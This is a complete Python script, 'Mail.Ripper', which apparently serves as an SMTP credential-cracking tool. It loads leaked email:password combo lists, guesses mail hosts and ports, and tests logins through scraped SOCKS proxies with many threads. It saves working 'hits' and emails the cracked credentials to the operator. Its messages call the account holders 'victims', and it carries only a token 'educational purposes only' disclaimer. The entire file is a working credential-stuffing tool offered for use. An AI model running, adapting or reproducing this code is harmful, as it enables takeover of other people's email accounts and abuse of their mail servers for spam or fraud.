#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
#name: Mail.Ripper v1 (proxy version)
#description: smtp checker / smtp cracker including mailsending check for hits and SOCKS4 / SOCKS5 support
#version: 1.08, 2020-11-28
#author: DrPython3
#----------------------------------------------------------------------------------------------------------------------
#((--> *P*A*C*K*A*G*E*S***N*E*E*D*E*D* <--))

import ctypes, os, smtplib, socket, sys, ssl, threading, time, json, re, uuid, email.mime, socks, random, urllib3
import certifi
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from random import randint
import colorama
from colorama import *
init()
print(Fore.GREEN + Style.BRIGHT + '')
#----------------------------------------------------------------------------------------------------------------------
#((--> *S*T*A*R*T*U*P***L*O*G*O* <--))

logo1 = '''
-------------------------------------------------------------------------
o     o         o 8     .oPYo.  o                                     .o 
8b   d8           8     8   `8                                         8 
8`b d'8 .oPYo. o8 8    o8YooP' o8 .oPYo. .oPYo. .oPYo. oPYo.   o    o  8 
8 `o' 8 .oooo8  8 8     8   `b  8 8    8 8    8 8oooo8 8  `'   Y.  .P  8 
8     8 8    8  8 8     8    8  8 8    8 8    8 8.     8       `b..d'  8 
8     8 `YooP8  8 8 88  8    8  8 8YooP' 8YooP' `Yooo' 8        `YP'   8 
..::::..:.....::......::..:::..:..8 ....:8 ....::.....:..::::::::...:::..
::::::::::::::::::::::::::::::::::8 :::::8 ::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::..:::::..::::::::::::::::::::::::::::::
-------------------------------------------------------------------------'''
logo2 = '''
              simple email checker by: DrPython3 (C) 2020
                 *** FOR EDUCATIONAL PURPOSES ONLY ***
                 
           DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf'''
#----------------------------------------------------------------------------------------------------------------------
#((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))

combofile = str('none.txt')
combos = []
socksprox = []
tout = float(123.0)
skip = int(1)
usesocks = int(0)
sockscount = int(0)
sockstype = int(5)
attackthreats = int(999)
valid = int(0)
bad = int(0)
attackermail = str('invalid@mail.com')
regexp = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w+$'
#suggested by Trustdee, dictionaries and lists are in config.json now:
try:
    with open('config.json') as config:
        jsonobj = json.load(config)
        hosters = (jsonobj['hosters'])
        hosterports = (jsonobj['hosterports'])
        subh = (jsonobj['subh'])
        subp = (jsonobj['subp'])
        blacklisted = (jsonobj['blacklisted'])
#fallback in case anything is wrong with json, so checker will still work using finder():
except:
    hosters = {}
    hosterports = {}
    subh = ['','mail.','webmail.','smtp.','mail2.','mx.','email.','mail1.','owa.','mx1.','exchange.','smtpauths.','smtpauth.',
            'smtp.mail.','smtp-mail.','securesmtp.']
    subp = [587,465,25,26,2525]
    blacklisted = ['gmail.com','googlemail.com','yahoo.com','yahoo.de','yahoo.co.uk','hotmail.com','protonmail.com','yandex.ru']
#----------------------------------------------------------------------------------------------------------------------
#((--> *F*U*N*C*T*I*O*N*S* <--))

#cleaner == clears screen on purpose:
def cleaner():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except: pass

#countdown == yes, a countdown (...):
def countdown():
    i = 5
    while i > 0:
        print(Fore.LIGHTYELLOW_EX + '... ' + str(i))
        sleep(0.9)
        i -= 1
    return None

#mailcheck == checks email user input with regex:
def mailcheck(email):
    if re.search(regexp, str(email)):
        return True
    else:
        return False

#checked == saves checked combos to a txt file:
def checked(checkedtext):
    with open('checked_combos.txt', 'a') as checkedfile:
        checkedfile.write(str(checkedtext) + '\n')
        checkedfile.close()

#hits == saves hits to a txt file:
def hits(hitstext):
    with open('valid_combos.txt', 'a') as hitsfile:
        hitsfile.write(str(hitstext) + '\n')
        hitsfile.close()

#skips == saves skipped combos to a txt file:
def skips(skiptext):
    with open('skipped_combos.txt', 'a') as skippedfile:
        skippedfile.write(str(skiptext) + '\n')
        skippedfile.close()

#blackcheck == searches for smtp domain in blacklist:
def blackcheck(search):
    try:
        x = int(blacklisted.count(str(search)))
        if x == 0:
            return False
        else:
            return True
    except: pass

#getproxdata == scrapes SOCKS4 proxies from Proxyscrape.com:
def getproxdata():
    if sockstype == int(5):
        print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS5 proxies - this may take a while ...\n')
    elif sockstype == int(4):
        print(Fore.LIGHTYELLOW_EX + '### PLEASE WAIT! ###\n\nScraping SOCKS4 proxies - this may take a while ...\n')
    psource = str('https://api.proxyscrape.com?request=displayproxies&proxytype=socks') + str(sockstype) + str('&timeout=2000')
    http = urllib3.PoolManager(ca_certs=certifi.where())
    proxydata = http.request('GET', psource)
    with open('proxydata.txt', 'a') as proxyfile:
        proxyfile.write(str(proxydata.data.decode('utf-8')))
        proxyfile.close()
    with open('proxydata.txt', 'r+') as p:
        p_new = p.readlines()
        p.seek(0)
        for line in p_new:
            if '<url' not in line:
                p.write(line)
        p.truncate()

#randomprox == returns random one from scraped proxies:
def randomprox():
    try:
        x = randint(0, int(sockscount))
        proxy = str(socksprox[int(x)])
        return proxy
    except:
        proxy = str('failed')
        return proxy

#finder == search for smtp hosts if not included in hosters dictionary:
def finder(unkdom):
    socket.setdefaulttimeout(tout)
    defcontext = ssl.create_default_context()
    if usesocks == int(1):
        rawproxy = str(randomprox())
        fproxy = str(rawproxy.split(":")[0])
        fproxyport = int(rawproxy.split(":")[1])
        if sockstype == int(4):
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
        elif sockstype == int(5):
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
        socks.wrapmodule(smtplib)
    else: pass
    z = str('failed')
    print(Fore.LIGHTYELLOW_EX + 'Looking up SMTP-host for: ' + str(unkdom) + ' ...')
    try:
        for x in subh:
            y = str(str(x) + str(unkdom))
            print(Fore.LIGHTMAGENTA_EX + 'Trying to connect to: ' + str(y) + ' ...')
            try:
                findsmtp = smtplib.SMTP_SSL(str(y), context=defcontext)
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'SSL-Connection established, HOST is: ' + str(y) + ' ...')
                z = str(y)
                break
            except:
                try:
                    findsmtp = smtplib.SMTP(str(y))
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(y) + ' ...')
                    z = str(y)
                    break
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for guessed HOST: ' + str(y) + ' ...')
                    try:
                        findsmtp.quit()
                    except: pass
                    continue
        try:
            findsmtp.quit()
        except:pass
        return z
    except BaseException:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Cannot find working SMTP host (!) for: ' + str(unkdom) + ' ...')
        return z

#attacker == connects to SMTP host, checks login data and returns result to main checker process:
def attacker(attackhost, attackport, attackuser, attackpass):
    socket.setdefaulttimeout(tout)
    attackcontext = ssl.create_default_context()
    if usesocks == int(1):
        rawproxy = str(randomprox())
        fproxy = str(rawproxy.split(":")[0])
        fproxyport = int(rawproxy.split(":")[1])
        if sockstype == int(4):
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, fproxy, fproxyport)
        elif sockstype == int(5):
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, fproxy, fproxyport)
        socks.wrapmodule(smtplib)
    else: pass
    try:
        #if SMTP port is unknown, try to find it using most common ones:
        if attackport == 0:
            print(Fore.LIGHTYELLOW_EX + 'Unknown port for HOST ' + str(attackhost)
                  + ', testing connection with most common ports ...')
            for x in subp:
                p = int(x)
                try:
                    attack = smtplib.SMTP_SSL(str(attackhost), int(p), context=attackcontext)
                    attack.quit()
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...')
                    attackport = int(p)
                    break
                except:
                    try:
                        attack = smtplib.SMTP(str(attackhost), int(p))
                        attack.quit()
                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'PORT for connection found: ' + str(p) + ' ...')
                        attackport = int(p)
                        break
                    except:
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Connection error (!) for HOST: ' + str(attackhost)
                              + ' on PORT: ' + str(p) + ' ...')
                        try:
                            attack.quit()
                        except: pass
                        continue
        else:
            print(Fore.LIGHTMAGENTA_EX + 'Starting attack on: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...')
        #if SMTP port is known, start checking combo against host:
        try:
            print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' with SSL ...')
            attack = smtplib.SMTP_SSL(str(attackhost), int(attackport), context=attackcontext)
            print(Fore.LIGHTMAGENTA_EX + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                  + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...')
        except:
            try:
                print(Fore.LIGHTMAGENTA_EX + 'Connecting to HOST ' + str(attackhost) + ':' + str(attackport) + ' without SSL ...')
                attack = smtplib.SMTP(str(attackhost), int(attackport))
                try:
                    print(Fore.LIGHTMAGENTA_EX + 'Trying to start TLS for HOST: ' + str(attackhost) + ' ...')
                    attack.starttls(context=attackcontext)
                except: pass
                print(Fore.LIGHTMAGENTA_EX + 'Checking login-data, HOST: ' + str(attackhost) + ':' + str(attackport) + ', USER: '
                      + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...')
            except: pass
        attack.login(str(attackuser), str(attackpass))
        attack.quit()
        #return result to checking process:
        if usesocks == int(1):
            return True, str(attackhost), int(attackport), str(attackuser), str(attackpass), str(fproxy), int(fproxyport)
        else:
            return True, str(attackhost), int(attackport), str(attackuser), str(attackpass)
    except:
        try:
            attack.quit()
        except: pass
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Connection or login error (!) for HOST: ' + str(attackhost) + ' on PORT: '
              + str(attackport) + ' ...')
        if usesocks == int(1):
            return False, str(attackhost), int(attackport), str(attackuser), str(attackpass), str(fproxy), int(fproxyport)
        else:
            return False, str(attackhost), int(attackport), str(attackuser), str(attackpass)

#sendcheckmsg == trys to send an e-mail to user address by valid SMTP:
def sendcheckmsg(mailhost, mailport, mailuser, mailpass, proxy, proxyport):
    if attackermail == str('invalid@mail.com'):
        print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Mailsending check skipped (!) for: ' + str(mailuser) + ' ...')
    else:
        socket.setdefaulttimeout(tout)
        msgcontext = ssl.create_default_context()
        if usesocks == (1):
            if sockstype == int(4):
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxy), int(proxyport))
            elif sockstype == int(5):
                socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxy), int(proxyport))
            socks.wrapmodule(smtplib)
        else: pass
        #generate randomID:
        randomid = uuid.uuid4().hex
        randomid = str(randomid[0:8])
        randomid = randomid.upper()
        #prepare e-mail content for sending check:
        mailsender = str(mailuser)
        mailreceiver = str(attackermail)
        mail = MIMEMultipart('alternative')
        mail['Subject'] = str('Test Result for ID ' + str(randomid))
        mail['From'] = str(mailsender)
        mail['To'] = str(mailreceiver)
        #mailcontent for plain text e-mail:
        mailtext = '''
        Hello!
        This message has been sent using the following SMTP:
        
        HOST: ''' + str(mailhost) + '''
        PORT: ''' + str(mailport) + '''
        USER: ''' + str(mailuser) + '''
        PASS: ''' + str(mailpass) + '''
        
        If you like Mail.Rip donate, please! My wallet (BTC):
        1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
        
        Every donations gives me time for improving this and other tools.
        
        Best wishes,
        DrPython3'''
        #mailcontent for HTML e-mail:
        mailhtml = '''
        <!doctype html>
        <html lang="en-US">
            <head>
                <title>Test Result for ID ''' + str(randomid) + '''</title>
            </head>
            <body>
                <p>Hello!</p>
                <p>This message has been sent using the following SMTP:</p>
                <p>
                    <b>HOST:</b> ''' + str(mailhost) + '''<br>
                    <b>PORT:</b> ''' + str(mailport) + '''<br>
                    <b>USER:</b> ''' + str(mailuser) + '''<br>
                    <b>PASS:</b> ''' + str(mailpass) + '''
                </p>
                <p>
                    <i>If you like <a href="https://github.com/DrPython3/mailripv1">Mail.Rip</a> donate, please! My wallet (BTC):</i><br>
                    <b>1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf</b>
                </p>
                <p>Every donation gives me time for improving this and other tools.</p>
                <p>
                    Best wishes,<br>
                    DrPython3
                </p>
            </body>
        </html>'''
        mpart1 = MIMEText(mailtext, "plain")
        mpart2 = MIMEText(mailhtml, "html")
        mail.attach(mpart1)
        mail.attach(mpart2)
        try:
            mailer = smtplib.SMTP_SSL(str(mailhost), int(mailport), context=msgcontext)
        except:
            try:
                mailer = smtplib.SMTP(str(mailhost), int(mailport))
                try:
                    mailer.starttls(context=msgcontext)
                except: pass
            except: pass
        try:
            mailer.login(str(mailuser), str(mailpass))
            mailer.sendmail(mailsender, mailreceiver, mail.as_string())
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Finally, an e-mail has been sent with: ' + str(mailuser)
                  + ' ... so, check your inbox later ...')
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser) + ' ...')
        try:
            mailer.quit()
        except: pass

#checkmate == the main checker process:
def checkmate():
    global valid
    global bad
    #starting main loop:
    while len(combos) > 0:
        checkresult = False
        th = str('')
        tp = int(0)
        tuser = str('')
        tpass = str('')
        proxy = str('')
        pport = int(0)
        try:
            #get next combo, clean it and split into mail and pass:
            lraw = combos.pop(0)
            lraw = lraw.replace(';', ':').replace('|', ':')
            l = lraw.split(':')
            #check blacklist for e-mail domain on purpose:
            if skip == 1:
                print(Fore.LIGHTMAGENTA_EX + 'Checking blacklist for host: ' + str(l[0].split("@")[1]) + ' ...')
                blackhost = blackcheck(str(l[0].split("@")[1]).lower())
                #if e-mail domain is on blacklist, combo will not be checked:
                if blackhost == True:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Host blacklisted, therefor skipping: ' + str(l[0]) + ':'
                          + str(l[1]) + ' ...')
                    skips(str(l[0]) + ':' + str(l[1]))
                    bad += 1
                    continue
                else: pass
            else: pass
            #try to get SMTP host from dictionary:
            try:
                targethost = str(hosters[str(l[0].split("@")[1]).lower()])
            except:
                #if not found in dictionary, start search for attackable SMTP host:
                try:
                    newhost = str(finder(str(l[0].split("@")[1]).lower()))
                    if newhost == str('failed'):
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':'
                              + str(l[1]) + ' ...')
                        skips(str(l[0]) + ':' + str(l[1]))
                        bad += 1
                        continue
                    else:
                        targethost = str(newhost)
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Error (!) while searching host for: ' + str(l[0])
                          + ':' + str(l[1]) + ' ...')
                    skips(str(l[0]) + ':' + str(l[1]))
                    bad += 1
                    continue
            #try to get SMTP port from dictionary and set to 0 if none is found:
            try:
                targetport = int(hosterports[str(targethost)])
            except:
                targetport = int(0)
            #check the combo against the SMTP host and write result to txt-file:
            if usesocks == int(1):
                checkresult, th, tp, tuser, tpass, proxy, pport = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
            else:
                checkresult, th, tp, tuser, tpass = attacker(str(targethost), int(targetport), str(l[0]), str(l[1]))
            if checkresult == False:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed victim ' + str(th) + ':' + str(tp) + ', USER: '
                      + str(tuser) + ', PASS: ' + str(tpass) + ' ...')
                checked(str(tuser) + ':' + str(tpass))
                bad += 1
                continue
            elif checkresult == True and tp == 465:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th)
                      + ':465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
                hits('SERVER: ' + str(th) + ', PORT: 465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            else:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT (!) Your victim ... HOST: ' + str(th) + ':' + str(tp)
                      + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
                hits('SERVER: ' + str(th) + ', PORT: ' + str(tp) + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            checked(str(tuser) + ':' + str(tpass))
            valid += 1
            #if combo is valid, try to send an e-mail using the cracked SMTP:
            if usesocks == int(1):
                sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str(proxy), int(pport))
            else:
                sendcheckmsg(str(th), int(tp), str(tuser), str(tpass), str('none'), int(0))
            continue
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Sorry, missed your victim ... HOST: ' + str(th) + ':' + str(tp)
                  + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...')
            checked(str(tuser) + ':' + str(tpass))
            bad += 1
            continue
#----------------------------------------------------------------------------------------------------------------------
#((<-- *M*A*I*N***P*R*O*G*R*A*M*M* -->))

#startup on clean screen with logos:
cleaner()
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)

#ask for user email address and check with regex:
try:
    attackermail = input(Fore.LIGHTWHITE_EX + '\nEnter your e-mail address, please:     ')
    checkmail = mailcheck(str(attackermail))
    if checkmail == True:
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill try to send messages to your e-mail: ' + str(attackermail)
              + ' when a valid SMTP is found ...\n')
    else:
        print(Fore.LIGHTRED_EX + Style.BRIGHT
              + '\n(!) Invalid e-mail (!) - checking the found SMTP by sending an e-mail will be skipped ...\n')
        attackermail = str('invalid@mail.com')
except:
    print(Fore.LIGHTRED_EX + Style.BRIGHT
          + '\n(!) Invalid e-mail (!) - checking the found SMTP by sending an e-mail will be skipped ...\n')
    attackermail = str('invalid@mail.com')

#ask for name of combofile:
combofile = input(Fore.LIGHTWHITE_EX + 'Enter name of your combofile, e.g. combos.txt :     ')

#check combofile:
if combofile == '':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'No filename entered. Bye bye!\n')
else:
    try:
        combos = open(combofile, 'r').read().splitlines()
    except:
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'Combofile not found. Check filename and start again!\n')

#return amount of combos to check:
tocheck = int(len(combos))
if tocheck == 0:
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + 'Combofile is empty. Bye bye!\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check ...\n')

#ask for default timeout:
try:
    tout = float(input(Fore.LIGHTWHITE_EX + 'Enter value for timeout (any key for default = 30.0) :     '))
except:
    tout = float(30.0)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')

#ask for amount of threads to use:
try:
    attackthreats = int(input(Fore.LIGHTWHITE_EX
                              + 'Enter amount of threads to use (any key for default = 25) :     '))
except:
    attackthreats = int(25)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(attackthreats) + ' ...\n')

#ask for skipping options:
skipuser = input(Fore.LIGHTWHITE_EX
                 + 'Want to skip services like GMAIL, etc. (yes / no, any key for default = yes) :    ')
if skipuser == 'no':
    skip = int(0)
elif skipuser == 'n':
    skip = int(0)
else:
    skip = int(1)
if skip == 0:
    print(Fore.LIGHTRED_EX + Style.BRIGHT
          + '\nWARNING: Services like GMAIL, etc. will not be skipped! You probably waste time ...\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL, etc. will be skipped and saved to a txt-file ...\n')

#ask for proxy support:
proxyuse = str(input(Fore.LIGHTWHITE_EX + 'Want to use SOCKS-proxies (yes / no, any key for default = no) :    '))
if proxyuse == 'yes':
    usesocks = int(1)
elif proxyuse == 'y':
    usesocks = int(1)
else:
    usesocks = int(0)
if usesocks == int(1):
    print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: SOCKS-proxies activated! Bad combos may be false negatives! ...\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nSOCKS-proxies not activated ...')
if usesocks == int(1):
    try:
        sockstype = int(input(Fore.LIGHTWHITE_EX + 'Which kind of SOCKS do you want to use (4 = SOCKS4, 5 = SOCKS5) :    '))
        if sockstype == int(4):
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS4 proxies ...\n')
        elif sockstype == int(5):
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS5 proxies ...\n')
    except:
        sockstype = int(4)
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nWill scrape and use SOCKS4 proxies ...\n')
else: pass

#ask to start checking:
startnow = input(Fore.LIGHTWHITE_EX + '*** DO YOU WANT TO START THE CHECKER NOW? *** (yes / no) :     ')
if startnow == 'no':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
elif startnow == 'n':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
else: pass

#start checker:
cleaner()
#if user wants to use proxies, start scraper:
if usesocks == int(1):
    try:
        getproxdata()
        socksprox = open('proxydata.txt', 'r').read().splitlines()
        sockscount = int(len(socksprox))
        if sockscount == 0:
            print(Fore.LIGHTYELLOW_EX + 'No proxies scraped! SOCKS-support is deactivated ...\n')
            usesocks = int(0)
        else:
            if sockstype == int(4):
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS4 proxies!\n')
            elif sockstype == int(5):
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '... scraped ' + str(sockscount) + ' SOCKS5 proxies!\n')
    except:
        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'An error occurred! SOCKS-support is deactivated ...\n')
        usesocks = int(0)
else: pass
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED NOW!\nLet us start shooting at your victims in ...\n\n')
countdown()
cleaner()
for _ in range(attackthreats):
    threading.Thread(target=checkmate).start()
while len(combos) > 0:
    try:
        #Show stats in title bar if run on Windows:
        sleep(0.1)
        ctypes.windll.kernel32.SetConsoleTitleW(f'LEFT TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}')
    #Stats in title bar for Unix & Co.:
    except:
        try:
            sleep(0.1)
            wintitle = str('LEFT TO CHECK: ' + str(len(combos)) + ' | HITS: ' + str(valid) + ' | BAD: ' + str(bad))
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except: pass
